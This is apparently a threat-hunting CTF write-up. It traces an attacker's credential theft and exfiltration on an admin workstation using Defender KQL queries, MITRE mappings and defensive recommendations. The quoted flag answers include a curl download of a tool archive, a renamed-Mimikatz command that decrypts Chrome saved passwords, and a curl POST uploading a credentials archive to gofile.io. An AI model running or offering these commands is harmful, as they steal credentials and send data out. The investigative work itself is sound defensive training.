![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B20.png)

Question: What command was used to download the credential theft tool?

```
curl.exe" -L -o m-temp.7z https://litter.catbox.moe/mt97cj.7z
```


# FLAG 21: CREDENTIAL ACCESS - Browser Credential Theft

Modern credential theft targets browser password stores, extracting saved credentials without triggering LSASS-focused detections.

The query used:

  - Searches process execution events (DeviceProcessEvents)

  - Focuses on the workstation azuki-adminpc

  - Detects execution of binaries named:

    - mimikatz.exe (well‑known credential‑dumping tool)

    - m.exe (commonly used as a renamed or obfuscated Mimikatz binary)

  - Returns execution details including:

    - Time of execution

    - Action type

    - Binary name and path

    - Full command line

This activity is critical severity:

Mimikatz is a post‑exploitation tool used to:

  - Dump plaintext passwords

  - Extract NTLM hashes

  - Steal Kerberos tickets

Renaming Mimikatz to m.exe is a common evasion technique

Execution on an admin workstation strongly suggests:

  - Credential compromise

  - Privilege escalation

  - Preparation for lateral movement or domain dominance

Query used: 

```
DeviceProcessEvents
| where DeviceName contains "azuki-adminpc"
| where FileName in ("m.exe","mimikatz.exe")
| project Timestamp, ActionType, FileName, FolderPath, ProcessCommandLine
```
## MITRE ATT&CK Mapping

**Tactic:** Credential Access  
**Technique:** OS Credential Dumping  
**Technique ID:** T1003  

**Tactic:** Credential Access  
**Technique:** LSASS Memory  
**Technique ID:** T1003.001  

**Tactic:** Defense Evasion  
**Technique:** Masquerading  
**Technique ID:** T1036  

**Tactic:** Privilege Escalation  
**Technique:** Valid Accounts  
**Technique ID:** T1078  

### Data Source
- Microsoft Defender for Endpoint
- `DeviceProcessEvents`

### Detection Logic
- Monitors execution of known credential‑dumping tools
- Detects common evasion via binary renaming
- Focuses on a privileged endpoint

### Investigative Value
- High‑confidence indicator of credential compromise
- Supports scoping of stolen credentials
- Enables rapid containment and response actions

Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B21.png)

Question: What command was used for browser credential theft?

```
"m.exe" privilege::debug "dpapi::chrome /in:%localappdata%\Google\Chrome\User Data\Default\Login Data /unprotect" exit
```

# FLAG 22: EXFILTRATION - Data Upload Command

Form-based HTTP uploads provide simple, reliable data exfiltration that blends with legitimate web traffic and supports large file transfers.

The query used:

  - Searches process execution events (DeviceProcessEvents)

  - Restricts results to the administrative workstation azuki-adminpc

  - Detects execution of curl.exe

  - Filters for executions that occurred during a remote session from IP 10.1.0.204

  - Further filters for HTTP POST requests in the command line

  - Orders the results chronologically

This is very high‑risk behavior, especially in combination:

curl with POST is commonly used to:

  - Upload files

  - Exfiltrate stolen data

  - Send command output to attacker infrastructure

Execution during a remote session indicates:

  - Hands‑on‑keyboard attacker activity

On an admin workstation, this suggests:

  - Data exfiltration

  - Command‑and‑control traffic disguised as normal web traffic

  - Post‑exploitation activity following credential compromise

Query used:

```
DeviceProcessEvents  
| where DeviceName == "azuki-adminpc"  
| where FileName == "curl.exe"
| where InitiatingProcessRemoteSessionIP == "10.1.0.204" 
| where ProcessCommandLine contains "POST"
| order by Timestamp asc 
```
## MITRE ATT&CK Mapping

**Tactic:** Exfiltration  
**Technique:** Exfiltration Over Web Services  
**Technique ID:** T1567  

**Tactic:** Command and Control  
**Technique:** Application Layer Protocol  
**Technique ID:** T1071  

**Tactic:** Command and Control  
**Technique:** Web Protocols  
**Technique ID:** T1071.001  

**Tactic:** Defense Evasion  
**Technique:** Living off the Land Binaries and Scripts  
**Technique ID:** T1218  

- Microsoft Defender for Endpoint
- `DeviceProcessEvents`

### Detection Logic
- Monitors execution of curl
- Detects HTTP POST usage in command-line arguments
- Focuses on remote-session activity on a privileged endpoint
  
### Investigative Value
- High-confidence indicator of data exfiltration
- Identifies hands-on-keyboard attacker behavior
- Provides full command-line context for destination and payload analysis

Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B22.png)

Question: Identify the command used to exfiltrate the first archive?

```
"curl.exe" -X POST -F file=@credentials.tar.gz https://store1.gofile.io/uploadFile
```


# FLAG 23: EXFILTRATION - Cloud Storage Service

Anonymous file sharing services provide temporary storage with self-destructing links, complicating data recovery and attribution.

Query used:

```
DeviceProcessEvents  
| where DeviceName == "azuki-adminpc"  
| where FileName == "curl.exe"
| where InitiatingProcessRemoteSessionIP == "10.1.0.204" 
| where ProcessCommandLine contains "POST"
| project Timestamp, FileName, FolderPath, ProcessCommandLine
| order by Timestamp asc 
```
Same as the previous query

Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B23.png)

Question: Identify the exfiltration service domain?

```
gofile.io
```

# FLAG 24: EXFILTRATION - Destination Server

IP addresses enable network-layer blocking and threat intelligence correlation when domain-based controls fail or are bypassed.

The query used:

  - Searches network connection events (DeviceNetworkEvents)

  - Focuses on the administrative workstation azuki-adminpc

  - Filters for activity initiated during a remote session from IP 10.1.0.204

  - Detects network connections created by a process whose command line contains curl

  - Further filters for connections to gofile, a public file‑sharing service

This activity is extremely suspicious:

GoFile is commonly abused for:

  - Hosting malware

  - Staging stolen data

  - Exfiltrating files via HTTP(S)

curl is a living‑off‑the‑land binary (LOLBin) often used to:

  - Upload stolen archives

- Download payloads

Execution during a remote session indicates:

  - Hands‑on‑keyboard attacker activity

On an admin workstation, this strongly suggests:

  - Data exfiltration

  - Command‑and‑control over web services

Query used: 

```
DeviceNetworkEvents
| where DeviceName contains "azuki-adminpc"
| where InitiatingProcessRemoteSessionIP == "10.1.0.204"
| where InitiatingProcessCommandLine contains "curl"
| where RemoteUrl contains "gofile"
```
## MITRE ATT&CK Mapping

**Tactic:** Exfiltration  
**Technique:** Exfiltration Over Web Services  
**Technique ID:** T1567  

**Tactic:** Command and Control  
**Technique:** Application Layer Protocol  
**Technique ID:** T1071  

**Tactic:** Command and Control  
**Technique:** Web Protocols  
**Technique ID:** T1071.001  

**Tactic:** Defense Evasion  
**Technique:** Living off the Land Binaries and Scripts  
**Technique ID:** T1218  

### Description
This detection identifies network connections from an administrative workstation to a public file-sharing service (`gofile`) initiated via `curl` during a remote session. Adversaries commonly abuse legitimate web services and native tools to exfiltrate data or communicate with command-and-control infrastructure while blending in with normal traffic.

### Data Source
- Microsoft Defender for Endpoint
- `DeviceNetworkEvents`

### Detection Logic
- Monitors curl-initiated network connections
- Detects access to public file-sharing services
- Focuses on remote-session activity on a privileged endpoint

### Investigative Value
- High-confidence indicator of data exfiltration
- Identifies abuse of trusted web services
- Supports reconstruction of attacker exfiltration paths

Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B24.png)

Question: Identify the exfiltration server IP address?

```
45.112.123.227
```

# FLAG 25: CREDENTIAL ACCESS - Master Password Extraction

Password managers store credentials for multiple systems. Extracting the master password provides access to all stored secrets.

The query used:

  - Searches process execution events (DeviceProcessEvents)

  - Focuses on the workstation azuki-adminpc

  - Filters for processes whose command line references a .txt file

  - Returns execution context including:

    - Time of execution

    - Device name

    - Executable name and path

    - Full command line

This behavior is contextually important, especially during an investigation:

.txt files are often used to:

  - Store stolen credentials

  - Capture command output

  - Stage reconnaissance data

Attackers frequently:

  - Redirect output to text files

  - Review collected data manually

On an admin workstation, this may indicate:

  - Data collection

  - Manual review of sensitive information

  - Preparation for exfiltration

Query used 

```
DeviceProcessEvents
| where DeviceName contains "azuki-adminpc"
| where ProcessCommandLine contains ".txt"
| project Timestamp, DeviceName, FileName, FolderPath, ProcessCommandLine
```
## MITRE ATT&CK Mapping

**Tactic:** Collection  
**Technique:** Data from Local System  
**Technique ID:** T1005  

**Tactic:** Collection  
**Technique:** Data Staged  
**Technique ID:** T1074  

**Tactic:** Discovery  
**Technique:** File and Directory Discovery  
**Technique ID:** T1083  

### Data Source
- Microsoft Defender for Endpoint
- `DeviceProcessEvents`

### Detection Logic
- Monitors process executions referencing `.txt` files
- Focuses on a privileged endpoint
- Provides execution context for investigation correlation

### Investigative Value
- Helps identify manual attacker activity
- Supports investigation of data collection and staging
- Useful for correlating with exfiltration or credential access activity

Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B25.png)

Question: What file contains the extracted master password?

```
KeePass-Master-Password.txt
```

##  Recommendations

### 1. Restrict Administrative Privileges and Monitor Privileged Accounts
- Ensure that high-privilege accounts (e.g., `yuki.tanaka`) are limited and monitored.
- Use Just-In-Time (JIT) access and session auditing to reduce risk from compromised accounts.

### 2. Implement Endpoint Protection and Credential Guarding
- Enable Microsoft Defender Credential Guard to protect LSASS memory.
- Monitor and block known credential dumping tools (e.g., Mimikatz or renamed variants).

### 3. Monitor and Control Data Staging and Exfiltration
- Detect archive creation in unusual system directories (e.g., `.zip`, `.7z`, `.tar`, `.gz` in `C:\ProgramData\Microsoft\Crypto\staging`).
- Monitor use of native binaries like `robocopy`, `xcopy`, `cmd.exe`, and `powershell.exe` for suspicious file copying activity.

### 4. Detect and Restrict Remote Session Data Transfers
- Monitor `curl.exe` or other HTTP/S-based uploads/downloads in remote sessions.
- Correlate remote session IPs with known internal/external threat indicators.
- Block or alert on connections to suspicious public file-sharing services like GoFile.

### 5. Audit and Monitor Sensitive File Access
- Track access to password managers (`KeePass`, `.kdbx`) and sensitive documents (`.txt` files) on admin workstations.
- Alert on unusual process executions referencing these files to detect potential credential theft or data collection.

##  Conclusion – CTF Challenge

This Capture The Flag (CTF) challenge simulated a realistic post-compromise scenario involving:

- **Credential access:** Mimikatz execution and KeePass access demonstrated how attackers target credentials to escalate privileges.

- **Data collection and staging:** Text files, `.txt` outputs, and archive creation illustrated attacker data aggregation techniques.

- **Exfiltration:** `curl` usage combined with public file-sharing services highlighted exfiltration over web protocols.

- **Remote hands-on keyboard activity:** Remote sessions from a single IP demonstrated interactive attacker behavior.

**Overall**, the challenge provided a comprehensive view of attacker behavior, emphasizing the importance of correlating process, file, and network events on privileged systems to detect and respond to malicious activity.

##  Lessons Learned

1. **Correlation is critical**  
   - Single events (e.g., opening a `.txt` file) may appear benign, but combined with remote sessions, archive creation, and credential access, they reveal the attack chain.

2. **LOLBins are widely abused**  
   - Legitimate tools (`curl`, `cmd.exe`, `powershell.exe`, `robocopy`) can be weaponized for exfiltration and lateral movement.

3. **Time windows matter**  
   - Filtering by timestamp enables investigators to focus on attack windows and prioritize high-confidence indicators.

4. **Privilege and context amplify risk**  
   - Actions performed on admin workstations or by privileged users are more critical and should be closely monitored.

5. **Defensive controls must be layered**  
   - Endpoint protection, credential guarding, network monitoring, and log correlation together provide effective detection of post-compromise activity.



